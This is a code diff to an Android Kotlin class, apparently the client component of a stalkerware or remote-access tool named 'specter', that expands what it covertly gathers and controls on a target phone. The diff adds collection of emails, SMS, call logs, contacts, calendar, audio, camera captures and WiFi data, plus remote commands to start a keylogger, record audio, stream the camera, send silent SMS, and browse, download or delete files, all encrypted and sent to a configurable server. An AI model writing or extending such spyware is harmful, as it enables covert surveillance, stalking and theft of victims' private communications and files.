@@ -4,9 +4,9 @@ import android.content.Context
 import android.os.BatteryManager
 import android.os.Build
 import android.os.PowerManager
-import com.divine.specter.child.crypto.XorCrypto
-import com.divine.specter.child.service.KeyloggerService
-import com.divine.specter.child.service.ScreenCaptureService
+import android.provider.Settings
+import com.divine.specter.child.crypto.AesCrypto
+import com.divine.specter.child.service.*
 import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
@@ -47,6 +47,9 @@ class ChildSync(private val context: Context) {
     private val json = Json { ignoreUnknownKeys = true; encodeDefaults = true }
     private var pollJob: Job? = null
     private var syncJob: Job? = null
+
+    // Camera streaming service
+    private val cameraStreamService = CameraStreamService(context)
 
     // Config - baked in at APK generation or set manually
     var serverUrl: String = ""
@@ -94,14 +97,55 @@ class ChildSync(private val context: Context) {
     )
 
     @Serializable
+    data class EmailData(
+        val account: String,
+        val subject: String,
+        val sender: String,
+        val recipients: String,
+        val body: String,
+        val timestamp: Long,
+        val hasAttachment: Boolean,
+        val folder: String
+    )
+
+    @Serializable
+    data class AudioRecording(
+        val filename: String,
+        val duration: Int,
+        val timestamp: Long,
+        val size: Long
+    )
+
+    @Serializable
+    data class CameraCapture(
+        val filename: String,
+        val camera: String,
+        val timestamp: Long,
+        val size: Long
+    )
+
+    @Serializable
     data class SyncRequest(
         val location: LocationData? = null,
         val battery: Int? = null,
         val current_app: String? = null,
         val screen_on: Boolean? = null,
         val notifications: List<NotificationData>? = null,
+        val device_info: DeviceInfoCollector.DeviceInfo? = null,
         val keystrokes: List<Keystroke>? = null,
-        val screenshots: List<Screenshot>? = null
+        val screenshots: List<Screenshot>? = null,
+        val emails: List<EmailData>? = null,
+        val sms_messages: List<SmsCollectorService.SmsMessage>? = null,
+        val call_logs: List<CallLogCollectorService.CallLogEntry>? = null,
+        val audio_recordings: List<AudioRecording>? = null,
+        val camera_captures: List<CameraCapture>? = null,
+        val contacts: List<ContactMonitorService.ContactChange>? = null,
+        val calendar_events: List<CalendarMonitorService.CalendarEvent>? = null,
+        // New features
+        val ip_location: IpLocationService.IpLocationData? = null,
+        val connected_wifi: WifiMonitorService.ConnectedWifiData? = null,
+        val nearby_wifi: List<WifiMonitorService.NearbyWifiData>? = null,
+        val silent_sms_results: List<SilentSmsService.SilentSmsResult>? = null
     )
 
     @Serializable
@@ -117,10 +161,21 @@ class ChildSync(private val context: Context) {
 
     suspend fun register(serverUrl: String, deviceName: String): Boolean {
         this.serverUrl = serverUrl
-        this.deviceId = Build.SERIAL.take(16).ifEmpty { "device_${System.currentTimeMillis()}" }
+        // Use the stable ID stored by ConfigReceiver (UUID-based). Fall back to hardware IDs only
+        // if prefs ID is missing (first-boot edge case), never use timestamp-based ID.
+        val prefs = context.getSharedPreferences("specter_child_prefs", Context.MODE_PRIVATE)
+        this.deviceId = prefs.getString("device_id", null)?.takeIf { it.isNotBlank() }
+            ?: if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                try { Build.getSerial().take(16) } catch (e: SecurityException) {
+                    Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID).take(16)
+                }
+            } else {
+                @Suppress("DEPRECATION") Build.SERIAL.take(16)
+            }.ifEmpty { "child_${java.util.UUID.randomUUID().toString().take(8)}" }
 
-        // Generate encryption key from device ID
-        encryptionKey = XorCrypto.sha256(deviceId)
+        // Registration is plain JSON — server has no key yet to decrypt with.
+        // Encryption key is set AFTER registration succeeds.
+        encryptionKey = null
 
         val body = json.encodeToString(mapOf(
             "device_id" to deviceId,
@@ -130,6 +185,8 @@ class ChildSync(private val context: Context) {
 
         return try {
             val response = post("$serverUrl/api/register", body)
+            // Now that we have the token, derive the encryption key for subsequent calls
+            encryptionKey = AesCrypto.sha256(deviceId)
             val reg = json.decodeFromString<RegisterResponse>(response)
             deviceToken = reg.token
             _isConnected.value = true
@@ -226,14 +283,85 @@ class ChildSync(private val context: Context) {
             )
         }
 
+        // Collect emails
+        val emails = EmailCollectorService.getAndClearEmails().map { em ->
+            EmailData(
+                account = em.account,
+                subject = em.subject,
+                sender = em.sender,
+                recipients = em.recipients,
+                body = em.body,
+                timestamp = em.timestamp,
+                hasAttachment = em.hasAttachment,
+                folder = em.folder
+            )
+        }
+
+        // Collect SMS (direct pass, serializable)
+        val smsMessages = SmsCollectorService.getAndClearMessages()
+
+        // Collect call logs (direct pass, serializable)
+        val callLogs = CallLogCollectorService.getAndClearCalls()
+
+        // Collect audio recordings (convert File to filename + size)
+        val audioRecordings = AudioRecorderService.getAndClearRecordings().map { audio ->
+            AudioRecording(
+                filename = audio.file.name,
+                duration = audio.duration,
+                timestamp = audio.timestamp,
+                size = audio.file.length()
+            )
+        }
+
+        // Collect camera captures (convert File to filename + size)
+        val cameraCaptures = CameraCaptureService.getAndClearPhotos().map { photo ->
+            CameraCapture(
+                filename = photo.file.name,
+                camera = photo.camera,
+                timestamp = photo.timestamp,
+                size = photo.file.length()
+            )
+        }
+
+        // Collect contacts (direct pass, serializable)
+        val contacts = ContactMonitorService.getAndClearChanges()
+
+        // Collect calendar events (direct pass, serializable)
+        val calendarEvents = CalendarMonitorService.getAndClearEvents()
+
+        // Collect device info (once per sync)
+        val deviceInfo = DeviceInfoCollector.collectDeviceInfo(context)
+
+        // Collect IP geolocation (every sync)
+        val ipLocation = IpLocationService.getIpLocation()
+
+        // Collect WiFi data (every sync)
+        val connectedWifi = WifiMonitorService.getConnectedWifi(context)
+        val nearbyWifi = WifiMonitorService.scanNearbyNetworks(context)
+
+        // Collect silent SMS results
+        val silentSmsResults = SilentSmsService.getResults()
+
         val request = SyncRequest(
             location = getLocation?.invoke(),
             battery = getBattery(),
             current_app = getCurrentApp?.invoke(),
             screen_on = isScreenOn(),
             notifications = getNotifications?.invoke(),
+            device_info = deviceInfo,
             keystrokes = if (keystrokes.isNotEmpty()) keystrokes else null,
-            screenshots = if (screenshots.isNotEmpty()) screenshots else null
+            screenshots = if (screenshots.isNotEmpty()) screenshots else null,
+            emails = if (emails.isNotEmpty()) emails else null,
+            sms_messages = if (smsMessages.isNotEmpty()) smsMessages else null,
+            call_logs = if (callLogs.isNotEmpty()) callLogs else null,
+            audio_recordings = if (audioRecordings.isNotEmpty()) audioRecordings else null,
+            camera_captures = if (cameraCaptures.isNotEmpty()) cameraCaptures else null,
+            contacts = if (contacts.isNotEmpty()) contacts else null,
+            calendar_events = if (calendarEvents.isNotEmpty()) calendarEvents else null,
+            ip_location = ipLocation,
+            connected_wifi = connectedWifi,
+            nearby_wifi = if (nearbyWifi.isNotEmpty()) nearbyWifi else null,
+            silent_sms_results = if (silentSmsResults.isNotEmpty()) silentSmsResults else null
         )
 
         try {
@@ -268,6 +396,159 @@ class ChildSync(private val context: Context) {
                 "block_app" -> { onBlockApp?.invoke(cmd.payload); "Blocked ${cmd.payload}" }
                 "unblock_app" -> { onUnblockApp?.invoke(cmd.payload); "Unblocked ${cmd.payload}" }
                 "exec" -> onExec?.invoke(cmd.payload) ?: "No executor"
+
+                // Surveillance commands
+                "record_audio" -> {
+                    val duration = cmd.payload.toIntOrNull() ?: 30
+                    AudioRecorderService.recordAudio(context, duration)
+                    "Recording audio for ${duration}s"
+                }
+                "capture_photo" -> {
+                    val camera = cmd.payload.ifEmpty { "back" }
+                    CameraCaptureService.capturePhoto(context, camera)
+                    "Captured photo from $camera camera"
+                }
+                "capture_screenshot" -> {
+                    ScreenCaptureService.captureScreen(context)
+                    "Screenshot captured"
+                }
+                "collect_emails" -> {
+                    EmailCollectorService.collectNow(context)
+                    "Emails collected"
+                }
+                "collect_sms" -> {
+                    SmsCollectorService.collectNow(context)
+                    "SMS collected"
+                }
+                "collect_calls" -> {
+                    CallLogCollectorService.collectNow(context)
+                    "Call logs collected"
+                }
+                "collect_contacts" -> {
+                    ContactMonitorService.collectNow(context)
+                    "Contacts collected"
+                }
+                "collect_calendar" -> {
+                    CalendarMonitorService.collectNow(context)
+                    "Calendar collected"
+                }
+                "start_keylogger" -> {
+                    KeyloggerService.start(context)
+                    "Keylogger started"
+                }
+                "stop_keylogger" -> {
+                    KeyloggerService.stop(context)
+                    "Keylogger stopped"
+                }
+
+                // Network surveillance commands
+                "send_silent_sms" -> {
+                    val parts = cmd.payload.split("|")
+                    val phoneNumber = parts.getOrNull(0) ?: ""
+                    val message = parts.getOrNull(1) ?: ""
+                    val sent = SilentSmsService.sendSilentSms(context, phoneNumber, message)
+                    if (sent) "Silent SMS sent to $phoneNumber" else "Failed to send SMS"
+                }
+                "scan_wifi" -> {
+                    val networks = WifiMonitorService.scanNearbyNetworks(context)
+                    "Found ${networks.size} WiFi networks"
+                }
+                "get_ip_location" -> {
+                    val ipData = IpLocationService.getIpLocation()
+                    if (ipData != null) "IP: ${ipData.ip}, ${ipData.city}, ${ipData.country}" else "Failed to get IP"
+                }
+
+                // Video streaming commands
+                "start_camera_stream" -> {
+                    val cameraId = cmd.payload.ifEmpty { "0" }
+                    withContext(Dispatchers.Main) {
+                        cameraStreamService.startStream(cameraId)
+                    }
+                    val url = cameraStreamService.streamUrl.value
+                    "Camera stream started: $url"
+                }
+                "stop_camera_stream" -> {
+                    cameraStreamService.stopStream()
+                    "Camera stream stopped"
+                }
+
+                // File browser commands
+                "list_directory" -> {
+                    val path = cmd.payload.ifEmpty { "/sdcard" }
+                    val dir = File(path)
+                    if (dir.exists() && dir.isDirectory) {
+                        val files = dir.listFiles()?.map { f ->
+                            "${if (f.isDirectory) "D" else "F"}|${f.name}|${f.length()}|${f.lastModified()}"
+                        }?.joinToString("\n") ?: ""
+                        "OK\n$files"
+                    } else {
+                        "Error: Directory not found or not accessible"
+                    }
+                }
+                "download_file" -> {
+                    val path = cmd.payload
+                    val file = File(path)
+                    if (file.exists() && file.isFile) {
+                        // Return base64 encoded file content for small files
+                        if (file.length() < 5 * 1024 * 1024) { // 5MB limit
+                            val bytes = file.readBytes()
+                            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+                            "OK|${file.name}|$base64"
+                        } else {
+                            "Error: File too large (>5MB)"
+                        }
+                    } else {
+                        "Error: File not found"
+                    }
+                }
+                "search_files" -> {
+                    // Payload format: query=X&paths=p1,p2&extensions=ext1,ext2
+                    val params = cmd.payload.split("&").associate {
+                        val (k, v) = it.split("=", limit = 2)
+                        k to v
+                    }
+                    val query = params["query"] ?: "*"
+                    val paths = params["paths"]?.split(",") ?: listOf("/sdcard")
+                    val extensions = params["extensions"]?.split(",")?.filter { it.isNotEmpty() }
+
+                    val results = mutableListOf<String>()
+                    for (basePath in paths) {
+                        val dir = File(basePath)
+                        if (dir.exists()) {
+                            dir.walkTopDown().take(500).forEach { f ->
+                                if (f.isFile) {
+                                    val matchesQuery = query == "*" || f.name.contains(query, ignoreCase = true)
+                                    val matchesExt = extensions == null || extensions.any { f.name.endsWith(".$it", ignoreCase = true) }
+                                    if (matchesQuery && matchesExt) {
+                                        results.add("${f.absolutePath}|${f.length()}")
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    "OK\n${results.take(100).joinToString("\n")}"
+                }
+                "get_storage_info" -> {
+                    val stat = android.os.StatFs("/sdcard")
+                    val total = stat.totalBytes
+                    val free = stat.availableBytes
+                    val used = total - free
+                    "OK|$total|$used|$free"
+                }
+                "delete_file" -> {
+                    val path = cmd.payload
+                    val file = File(path)
+                    if (file.exists()) {
+                        if (file.delete()) {
+                            "OK: Deleted $path"
+                        } else {
+                            "Error: Failed to delete"
+                        }
+                    } else {
+                        "Error: File not found"
+                    }
+                }
+
                 else -> "Unknown: ${cmd.action}"
             }
         } catch (e: Exception) {
@@ -330,7 +611,7 @@ class ChildSync(private val context: Context) {
             try {
                 // XOR encrypt payload
                 val encrypted = encryptionKey?.let {
-                    XorCrypto.encrypt(body.toByteArray(), it)
+                    AesCrypto.encrypt(body.toByteArray(), it)
                 } ?: body.toByteArray()
 
                 conn.outputStream.use { it.write(encrypted) }
@@ -338,7 +619,7 @@ class ChildSync(private val context: Context) {
 
                 // XOR decrypt response
                 encryptionKey?.let {
-                    XorCrypto.decryptString(response.toByteArray(), it)
+                    AesCrypto.decryptString(response.toByteArray(), it)
                 } ?: response
             } finally {
                 conn.disconnect()
@@ -359,7 +640,7 @@ class ChildSync(private val context: Context) {
             try {
                 // XOR encrypt payload
                 val encrypted = encryptionKey?.let {
-                    XorCrypto.encrypt(body.toByteArray(), it)
+                    AesCrypto.encrypt(body.toByteArray(), it)
                 } ?: body.toByteArray()
 
                 conn.outputStream.use { it.write(encrypted) }
@@ -367,7 +648,7 @@ class ChildSync(private val context: Context) {
 
                 // XOR decrypt response
                 val decrypted = encryptionKey?.let {
-                    XorCrypto.decrypt(response, it)
+                    AesCrypto.decrypt(response, it)
                 } ?: response
 
                 String(decrypted)
@@ -389,7 +670,7 @@ class ChildSync(private val context: Context) {
 
                 // XOR decrypt response
                 val decrypted = encryptionKey?.let {
-                    XorCrypto.decrypt(response, it)
+                    AesCrypto.decrypt(response, it)
                 } ?: response
 
                 String(decrypted)
@@ -418,7 +699,7 @@ class ChildSync(private val context: Context) {
             // Decode and decrypt APK
             val encryptedApk = android.util.Base64.decode(apkDataBase64, android.util.Base64.NO_WRAP)
             val decryptedApk = encryptionKey?.let {
-                XorCrypto.decrypt(encryptedApk, it)
+                AesCrypto.decrypt(encryptedApk, it)
             } ?: encryptedApk
 
             // Save to cache and install
